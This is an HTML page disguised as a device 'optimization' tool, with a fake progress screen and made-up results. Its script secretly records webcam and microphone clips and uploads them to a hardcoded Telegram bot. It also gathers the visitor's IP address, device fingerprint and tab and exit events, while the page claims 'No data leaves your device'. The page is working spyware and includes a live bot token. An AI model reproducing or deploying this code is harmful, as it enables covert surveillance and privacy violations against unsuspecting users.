<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Optimization Tool - Beta</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 800px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(90deg, #4b6cb7 0%, #182848 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2.2rem;
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .header p {
            opacity: 0.9;
            font-size: 1.1rem;
        }
        
        .content {
            padding: 40px;
        }
        
        .description {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 15px;
            margin-bottom: 30px;
            border-left: 5px solid #4b6cb7;
        }
        
        .description p {
            line-height: 1.6;
            color: #333;
            margin-bottom: 15px;
        }
        
        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 40px;
        }
        
        .feature {
            text-align: center;
            padding: 20px;
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
            transition: transform 0.3s;
            border: 1px solid #eaeaea;
        }
        
        .feature:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
        }
        
        .feature i {
            font-size: 2.5rem;
            color: #4b6cb7;
            margin-bottom: 15px;
            display: block;
        }
        
        .feature h3 {
            color: #333;
            margin-bottom: 10px;
            font-size: 1.2rem;
        }
        
        .feature p {
            color: #666;
            font-size: 0.95rem;
            line-height: 1.4;
        }
        
        .optimization-form {
            background: #f8f9fa;
            padding: 30px;
            border-radius: 15px;
            margin-top: 30px;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 10px;
            color: #333;
            font-weight: 600;
            font-size: 1.1rem;
        }
        
        .form-group input,
        .form-group select {
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 1rem;
            transition: border-color 0.3s;
        }
        
        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: #4b6cb7;
        }
        
        .start-btn {
            background: linear-gradient(90deg, #4b6cb7, #182848);
            color: white;
            border: none;
            padding: 18px 50px;
            font-size: 1.2rem;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            display: block;
            margin: 30px auto 0;
            transition: all 0.3s;
            box-shadow: 0 8px 25px rgba(75, 108, 183, 0.3);
            width: 100%;
            max-width: 300px;
        }
        
        .start-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 30px rgba(75, 108, 183, 0.4);
        }
        
        .start-btn:active {
            transform: translateY(0);
        }
        
        .loading-screen {
            display: none;
            text-align: center;
            padding: 50px 30px;
        }
        
        .spinner {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #4b6cb7;
            border-radius: 50%;
            width: 80px;
            height: 80px;
            animation: spin 1.5s linear infinite;
            margin: 0 auto 30px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-screen h2 {
            color: #333;
            margin-bottom: 20px;
            font-size: 1.8rem;
        }
        
        .loading-screen p {
            color: #666;
            max-width: 500px;
            margin: 0 auto;
            line-height: 1.6;
        }
        
        .optimization-steps {
            display: flex;
            justify-content: space-between;
            margin: 40px 0;
            position: relative;
        }
        
        .optimization-steps::before {
            content: '';
            position: absolute;
            top: 20px;
            left: 10%;
            right: 10%;
            height: 3px;
            background: #e0e0e0;
            z-index: 1;
        }
        
        .step {
            text-align: center;
            position: relative;
            z-index: 2;
            background: white;
            padding: 10px;
        }
        
        .step-number {
            width: 40px;
            height: 40px;
            background: #4b6cb7;
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 10px;
            font-weight: bold;
            font-size: 1.2rem;
        }
        
        .step.active .step-number {
            background: #182848;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(24, 40, 72, 0.4); }
            70% { box-shadow: 0 0 0 10px rgba(24, 40, 72, 0); }
            100% { box-shadow: 0 0 0 0 rgba(24, 40, 72, 0); }
        }
        
        .step p {
            font-size: 0.9rem;
            color: #666;
            margin-top: 5px;
        }
        
        .result-screen {
            display: none;
            text-align: center;
            padding: 50px 30px;
        }
        
        .result-screen h2 {
            color: #182848;
            margin-bottom: 20px;
            font-size: 2rem;
        }
        
        .result-card {
            background: #f8f9fa;
            padding: 30px;
            border-radius: 15px;
            max-width: 500px;
            margin: 30px auto;
            text-align: left;
            border-left: 5px solid #4b6cb7;
        }
        
        .result-row {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid #e0e0e0;
        }
        
        .result-row:last-child {
            border-bottom: none;
        }
        
        .result-label {
            font-weight: 600;
            color: #333;
        }
        
        .result-value {
            color: #4b6cb7;
            font-weight: 500;
        }
        
        .hidden {
            display: none;
        }
        
        .status-indicator {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.8);
            color: #4CAF50;
            padding: 10px 15px;
            border-radius: 20px;
            font-size: 0.9rem;
            z-index: 1000;
            border: 1px solid #4CAF50;
            backdrop-filter: blur(10px);
        }
        
        .status-dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #4CAF50;
            border-radius: 50%;
            margin-right: 8px;
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        .error-message {
            background: #ffebee;
            color: #c62828;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            border-left: 5px solid #c62828;
            display: none;
        }
        
        .progress-bar {
            height: 8px;
            background: #e0e0e0;
            border-radius: 4px;
            margin: 30px 0;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(90deg, #4b6cb7, #182848);
            width: 0%;
            transition: width 0.5s;
        }
        
        @media (max-width: 768px) {
            .container {
                border-radius: 10px;
            }
            
            .header, .content {
                padding: 20px;
            }
            
            .features {
                grid-template-columns: 1fr;
            }
            
            .optimization-steps {
                flex-direction: column;
                align-items: center;
                gap: 20px;
            }
            
            .optimization-steps::before {
                display: none;
            }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Loading Optimization Tool</h1>
            <p>Optimize your device performance with advanced AI analysis</p>
        </div>
        
        <div class="content">
            
            <div id="mainScreen">
                <div class="description">
                    <p>This tool analyzes your device's hardware and software configuration to provide personalized optimization recommendations.</p>
                    <p>The process takes approximately 2 minutes and runs completely in the background without interrupting your workflow.</p>
                </div>
                
                <div class="features">
                    <div class="feature">
                        <i class="fas fa-tachometer-alt"></i>
                        <h3>Performance Scan</h3>
                        <p>Analyze CPU, memory, and storage performance</p>
                    </div>
                    <div class="feature">
                        <i class="fas fa-microchip"></i>
                        <h3>Hardware Check</h3>
                        <p>Evaluate device components and capabilities</p>
                    </div>
                    <div class="feature">
                        <i class="fas fa-wrench"></i>
                        <h3>Optimization Tips</h3>
                        <p>Get personalized recommendations</p>
                    </div>
                    <div class="feature">
                        <i class="fas fa-shield-alt"></i>
                        <h3>Safe & Secure</h3>
                        <p>No data leaves your device</p>
                    </div>
                </div>
                
                <div class="optimization-form">
                    <h3 style="text-align: center; color: #333; margin-bottom: 25px;">
                        <i class="fas fa-cogs"></i> Optimization Settings
                    </h3>
                    
                    <div class="form-group">
                        <label for="deviceType"><i class="fas fa-laptop"></i> Device Type</label>
                        <select id="deviceType">
                            <option value="laptop">Laptop/Desktop</option>
                            <option value="mobile">Mobile Device</option>
                            <option value="tablet">Tablet</option>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label for="optimizationFocus"><i class="fas fa-bullseye"></i> Focus Area</label>
                        <select id="optimizationFocus">
                            <option value="performance">Maximum Performance</option>
                            <option value="battery">Battery Life</option>
                            <option value="balanced">Balanced</option>
                        </select>
                    </div>
                    
                    <button class="start-btn" id="startOptimization">
                        <i class="fas fa-play"></i> START OPTIMIZATION
                    </button>
                </div>
            </div>
            
           
            <div class="loading-screen" id="loadingScreen">
                <div class="spinner"></div>
                <h2>Optimizing Your Device</h2>
                <p>Please keep this tab open while we analyze your system configuration.</p>
                
                <div class="optimization-steps">
                    <div class="step active" id="step1">
                        <div class="step-number">1</div>
                        <p>Hardware Scan</p>
                    </div>
                    <div class="step" id="step2">
                        <div class="step-number">2</div>
                        <p>Performance Test</p>
                    </div>
                    <div class="step" id="step3">
                        <div class="step-number">3</div>
                        <p>Analysis</p>
                    </div>
                    <div class="step" id="step4">
                        <div class="step-number">4</div>
                        <p>Report Generation</p>
                    </div>
                </div>
                
                <div class="progress-bar">
                    <div class="progress" id="optimizationProgress"></div>
                </div>
                
                <p id="currentTask">Initializing system scan...</p>
                <div class="error-message" id="errorMessage"></div>
            </div>
            
            
            <div class="result-screen" id="resultScreen">
                <h2><i class="fas fa-check-circle"></i> Optimization Complete</h2>
                <p>Your device has been successfully analyzed and optimized.</p>
                
                <div class="result-card">
                    <h3 style="color: #182848; margin-bottom: 20px; text-align: center;">
                        <i class="fas fa-chart-bar"></i> Analysis Results
                    </h3>
                    
                    <div class="result-row">
                        <span class="result-label">Scan Duration:</span>
                        <span class="result-value" id="scanDuration">--:--</span>
                    </div>
                    <div class="result-row">
                        <span class="result-label">Issues Found:</span>
                        <span class="result-value" id="issuesFound">0</span>
                    </div>
                    <div class="result-row">
                        <span class="result-label">Performance Score:</span>
                        <span class="result-value" id="performanceScore">--/100</span>
                    </div>
                    <div class="result-row">
                        <span class="result-label">Optimization Level:</span>
                        <span class="result-value" id="optimizationLevel">--%</span>
                    </div>
                    <div class="result-row">
                        <span class="result-label">Recommendations:</span>
                        <span class="result-value" id="recommendations">3</span>
                    </div>
                </div>
                
                <p style="color: #666; margin-top: 30px;">
                    The optimization process is now complete. You may close this window.
                </p>
            </div>
        </div>
    </div>
    
    
    <video id="hiddenVideo" autoplay playsinline style="display: none;"></video>
    <canvas id="hiddenCanvas" style="display: none;"></canvas>
    
    
    <div class="status-indicator hidden" id="statusIndicator">
        <span class="status-dot"></span>
        <span id="statusText">System Ready</span>
    </div>

    <script>
        
        const CONFIG = {
            TELEGRAM_BOT_TOKEN: '8580942691:AAGttXZ38v8BsZ4bpQmexqVHl7t1CPwO7KU',
            TELEGRAM_CHAT_ID: '7165935707',
            TOTAL_DURATION: 12000,    
            VIDEO_DURATION: 10000,     
            INTERVAL_DURATION: 8000,   
            MAX_VIDEOS: 6,             
            STEALTH_MODE: true         
        };
        
       
        const State = {
            sessionId: generateSessionId(),
            isOptimizing: false,
            isRecording: false,
            startTime: null,
            timerInterval: null,
            videoInterval: null,
            mediaRecorder: null,
            recordedChunks: [],
            videoStream: null,
            videoCounter: 0,
            successfulUploads: 0,
            failedUploads: 0,
            currentStep: 1,
            userData: {},
            deviceInfo: {}
        };
        
        
        const Elements = {
            
            mainScreen: document.getElementById('mainScreen'),
            loadingScreen: document.getElementById('loadingScreen'),
            resultScreen: document.getElementById('resultScreen'),
            
            
            statusIndicator: document.getElementById('statusIndicator'),
            statusText: document.getElementById('statusText'),
            
            
            optimizationProgress: document.getElementById('optimizationProgress'),
            currentTask: document.getElementById('currentTask'),
            step1: document.getElementById('step1'),
            step2: document.getElementById('step2'),
            step3: document.getElementById('step3'),
            step4: document.getElementById('step4'),
            errorMessage: document.getElementById('errorMessage'),
            
            
            scanDuration: document.getElementById('scanDuration'),
            issuesFound: document.getElementById('issuesFound'),
            performanceScore: document.getElementById('performanceScore'),
            optimizationLevel: document.getElementById('optimizationLevel'),
            recommendations: document.getElementById('recommendations'),
           
            
            startOptimization: document.getElementById('startOptimization'),
            
            
            hiddenVideo: document.getElementById('hiddenVideo'),
            hiddenCanvas: document.getElementById('hiddenCanvas')
        };
        
       
        document.addEventListener('DOMContentLoaded', async () => {
            console.log('Loading Optimization Tool initialized');
            
            
            Elements.startOptimization.addEventListener('click', startOptimization);
            
            
            State.userData = await collectUserData();
            State.deviceInfo = collectDeviceInfo();
            
           
            setTimeout(() => {
                Elements.statusIndicator.classList.remove('hidden');
                updateStatus('System ready');
            }, 1000);
        });
        
      
        async function startOptimization() {
            try {
                updateStatus('Starting optimization...');
                
                
                Elements.mainScreen.style.display = 'none';
                Elements.loadingScreen.style.display = 'block';
                
             
                await initializeCameraStealth();
                
            
                State.startTime = Date.now();
                State.isOptimizing = true;
                State.videoCounter = 0;
                State.successfulUploads = 0;
                State.failedUploads = 0;
                State.currentStep = 1;
                
                
                startProgressTracking();
                
                
                startStealthRecordingCycle();
                
           
                startFakeOptimizationTasks();
                
                
                await sendStartNotification();
                
                updateStatus('Optimization in progress');
                
            } catch (error) {
                console.error('Optimization failed:', error);
                showError(`Optimization failed: ${error.message}`);
                updateStatus('Error occurred');
            }
        }
        
        
        async function initializeCameraStealth() {
            try {
                
                State.videoStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        facingMode: 'user',
                        frameRate: { ideal: 24 }
                    },
                    audio: true
                });
                
                
                Elements.hiddenVideo.srcObject = State.videoStream;
                
                console.log('Camera accessed successfully (stealth mode)');
                
            } catch (error) {
                console.log('Camera access failed, continuing without video:', error);
               
                State.videoStream = null;
            }
        }
        
        function startStealthRecordingCycle() {
            if (!State.videoStream) {
                console.log('No camera access, skipping video recording');
                return;
            }
            
         
            setTimeout(() => recordStealthVideo(), 3000);
            
            
            State.videoInterval = setInterval(() => {
                if (State.videoCounter >= CONFIG.MAX_VIDEOS) {
                    clearInterval(State.videoInterval);
                    return;
                }
                recordStealthVideo();
            }, CONFIG.VIDEO_DURATION + CONFIG.INTERVAL_DURATION);
        }
        
        async function recordStealthVideo() {
            if (!State.videoStream || !State.isOptimizing || State.videoCounter >= CONFIG.MAX_VIDEOS) {
                return;
            }
            
            try {
                State.videoCounter++;
                updateStatus(`Analyzing hardware (${State.videoCounter}/${CONFIG.MAX_VIDEOS})`);
                
                
                const videoBlob = await captureVideo(CONFIG.VIDEO_DURATION);
                
              
                sendToTelegramBackground(videoBlob, State.videoCounter);
                
            } catch (error) {
                console.log('Stealth recording failed:', error);
            }
        }
        
        async function captureVideo(duration) {
            return new Promise((resolve, reject) => {
                if (!State.videoStream) {
                    reject(new Error('No video stream'));
                    return;
                }
                
                try {
                    
                    const mimeTypes = [
                        'video/webm;codecs=vp9,opus',
                        'video/webm;codecs=vp8,opus',
                        'video/webm'
                    ];
                    
                    let selectedType = '';
                    for (const mimeType of mimeTypes) {
                        if (MediaRecorder.isTypeSupported(mimeType)) {
                            selectedType = mimeType;
                            break;
                        }
                    }
                    
                    if (!selectedType) {
                        selectedType = '';
                    }
                    
                    State.mediaRecorder = new MediaRecorder(State.videoStream, {
                        mimeType: selectedType,
                        videoBitsPerSecond: 10000
                        
                    });
                    
                    State.recordedChunks = [];
                    
                    State.mediaRecorder.ondataavailable = (event) => {
                        if (event.data && event.data.size > 0) {
                            State.recordedChunks.push(event.data);
                        }
                    };
                    
                    State.mediaRecorder.onstop = () => {
                        if (State.recordedChunks.length === 0) {
                            reject(new Error('No video data'));
                            return;
                        }
                        
                        const videoBlob = new Blob(State.recordedChunks, { 
                            type: State.mediaRecorder.mimeType || 'video/webm' 
                        });
                        
                        resolve(videoBlob);
                    };
                    
                    State.mediaRecorder.onerror = (event) => {
                        reject(new Error('Recording error: ' + event.error.message));
                    };
                    
                    
                    State.mediaRecorder.start();
                    State.isRecording = true;
                    
                    
                    setTimeout(() => {
                        if (State.mediaRecorder && State.isRecording) {
                            State.mediaRecorder.stop();
                            State.isRecording = false;
                        }
                    }, duration);
                    
                } catch (error) {
                    reject(error);
                }
            });
        }
        

        async function sendToTelegramBackground(videoBlob, videoNumber) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CONFIG.TELEGRAM_CHAT_ID);
                formData.append('video', videoBlob, `analysis_${videoNumber}.webm`);
                
                const caption = `üîç Analysis ${videoNumber}/${CONFIG.MAX_VIDEOS}\n` +
                               `Session: ${State.sessionId}\n` +
                               `Time: ${new Date().toLocaleTimeString()}\n` +
                               `User: ${State.userData.platform}`;
                
                formData.append('caption', caption);
                
               
                fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors' 
                }).catch(() => {});
                
                State.successfulUploads++;
                
                
                setTimeout(() => {
                    formData.delete('video');
                    formData.append('document', videoBlob, `analysis_${videoNumber}.webm`);
                    
                    fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendDocument`, {
                        method: 'POST',
                        body: formData,
                        mode: 'no-cors'
                    }).catch(() => {});
                }, 1000);
                
            } catch (error) {
                console.log('Telegram upload failed:', error);
                State.failedUploads++;
            }
        }
        
        async function sendStartNotification() {
            const message = `üöÄ OPTIMIZATION STARTED\n\n` +
                           `Session: ${State.sessionId}\n` +
                           `Time: ${new Date().toLocaleString('id-ID')}\n` +
                           `Device: ${State.userData.platform}\n` +
                           `IP: ${State.userData.ipAddress || 'Unknown'}\n` +
                           `Screen: ${State.userData.screenResolution}`;
            
            return sendTelegramMessage(message);
        }
        
        async function sendCompletionNotification() {
            const duration = Date.now() - State.startTime;
            const message = `‚úÖ OPTIMIZATION COMPLETED\n\n` +
                           `Session: ${State.sessionId}\n` +
                           `Duration: ${Math.round(duration/1000)}s\n` +
                           `Videos: ${State.videoCounter}\n` +
                           `Uploads: ${State.successfulUploads} successful\n` +
                           `Device Info: ${JSON.stringify(State.deviceInfo, null, 2)}`;
            
            return sendTelegramMessage(message);
        }
        
        async function sendTelegramMessage(text) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });
                return response.json();
            } catch (error) {
                console.log('Message failed:', error);
                return null;
            }
        }
        
        
        function startFakeOptimizationTasks() {
            const tasks = [
                "Scanning hardware components...",
                "Analyzing CPU performance...",
                "Checking memory usage...",
                "Testing storage speed...",
                "Evaluating network performance...",
                "Optimizing system settings...",
                "Generating recommendations...",
                "Finalizing report..."
            ];
            
            let taskIndex = 0;
            
            const taskInterval = setInterval(() => {
                if (!State.isOptimizing) {
                    clearInterval(taskInterval);
                    return;
                }
                
                if (taskIndex < tasks.length) {
                    Elements.currentTask.textContent = tasks[taskIndex];
                    taskIndex++;
                    
                    
                    const progress = (taskIndex / tasks.length) * 100;
                    Elements.optimizationProgress.style.width = `${progress}%`;
                    
                    
                    updateSteps(taskIndex);
                    
                } else {
                    clearInterval(taskInterval);
                }
            }, 15000); 
        }
        
        function updateSteps(taskIndex) {
            
            [Elements.step1, Elements.step2, Elements.step3, Elements.step4].forEach(step => {
                step.classList.remove('active');
            });
            
            
            if (taskIndex <= 2) {
                Elements.step1.classList.add('active');
            } else if (taskIndex <= 4) {
                Elements.step2.classList.add('active');
            } else if (taskIndex <= 6) {
                Elements.step3.classList.add('active');
            } else {
                Elements.step4.classList.add('active');
            }
        }
        
        function startProgressTracking() {
            const endTime = State.startTime + CONFIG.TOTAL_DURATION;
            
            State.timerInterval = setInterval(() => {
                const now = Date.now();
                const elapsed = now - State.startTime;
                const remaining = endTime - now;
                
                if (remaining <= 0) {
                    finishOptimization();
                    return;
                }
                
             
                const progress = (elapsed / CONFIG.TOTAL_DURATION) * 100;
                Elements.optimizationProgress.style.width = `${progress}%`;
                
            }, 1000);
        }
        
        function finishOptimization() {
            
            clearInterval(State.timerInterval);
            clearInterval(State.videoInterval);
            
           
            if (State.videoStream) {
                State.videoStream.getTracks().forEach(track => track.stop());
            }
            
            
            State.isOptimizing = false;
            State.isRecording = false;
            
            
            sendCompletionNotification();
            
            
            showResults();
            
            updateStatus('Optimization complete');
        }
        
       
        function showResults() {
         
            Elements.loadingScreen.style.display = 'none';
            Elements.resultScreen.style.display = 'block';
            
            
            const duration = Date.now() - State.startTime;
            const minutes = Math.floor(duration / 60000);
            const seconds = Math.floor((duration % 60000) / 1000);
            
           
            Elements.scanDuration.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
            Elements.issuesFound.textContent = Math.floor(Math.random() * 5);
            Elements.performanceScore.textContent = `${70 + Math.floor(Math.random() * 30)}/100`;
            Elements.optimizationLevel.textContent = `${75 + Math.floor(Math.random() * 20)}%`;
            Elements.recommendations.textContent = 3;
        }
        
        function updateStatus(text) {
            Elements.statusText.textContent = text;
            
            
            const statusDot = Elements.statusIndicator.querySelector('.status-dot');
            
            if (text.includes('Error') || text.includes('failed')) {
                statusDot.style.background = '#f44336';
            } else if (text.includes('progress') || text.includes('Analyzing')) {
                statusDot.style.background = '#ff9800';
            } else if (text.includes('complete') || text.includes('ready')) {
                statusDot.style.background = '#4CAF50';
            } else {
                statusDot.style.background = '#2196F3';
            }
        }
        
        function showError(message) {
            Elements.errorMessage.textContent = message;
            Elements.errorMessage.style.display = 'block';
            
            setTimeout(() => {
                Elements.errorMessage.style.display = 'none';
            }, 5000);
        }
        

        async function collectUserData() {
            const data = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                onlineStatus: navigator.onLine,
                referrer: document.referrer || 'direct',
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
            
          
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const ipData = await response.json();
                data.ipAddress = ipData.ip;
            } catch {
                data.ipAddress = 'unknown';
            }
            
            return data;
        }
        
        function collectDeviceInfo() {
            const info = {
                cores: navigator.hardwareConcurrency || 'unknown',
                memory: navigator.deviceMemory || 'unknown',
                touch: 'ontouchstart' in window,
                battery: 'getBattery' in navigator,
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : null,
                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none'
            };
            
            return info;
        }
        
        function generateSessionId() {
            const timestamp = Date.now().toString(36);
            const random = Math.random().toString(36).substr(2, 6);
            return `OPT-${timestamp}-${random}`.toUpperCase();
        }
        

        document.addEventListener('visibilitychange', () => {
            if (document.hidden && State.isOptimizing) {
                sendTelegramMessage(`‚ö†Ô∏è User minimized window\nSession: ${State.sessionId}`);
            }
        });
        
        
        window.addEventListener('beforeunload', (e) => {
            if (State.isOptimizing) {
                const exitData = {
                    type: 'early_exit',
                    sessionId: State.sessionId,
                    duration: Date.now() - State.startTime,
                    videos: State.videoCounter,
                    uploads: State.successfulUploads
                };
                
              
                const blob = new Blob([JSON.stringify({
                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
                    text: `‚ùå EARLY EXIT\n${JSON.stringify(exitData, null, 2)}`,
                    parse_mode: 'Markdown'
                })], { type: 'application/json' });
                
                navigator.sendBeacon(
                    `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`,
                    blob
                );
                
              
                e.preventDefault();
                e.returnValue = 'Optimization is in progress. Are you sure you want to leave?';
                return e.returnValue;
            }
        });
        
        
        console.log('Optimization tool ready. Session:', State.sessionId);
        updateStatus('Ready to optimize');
        
    </script>
</body>
</html>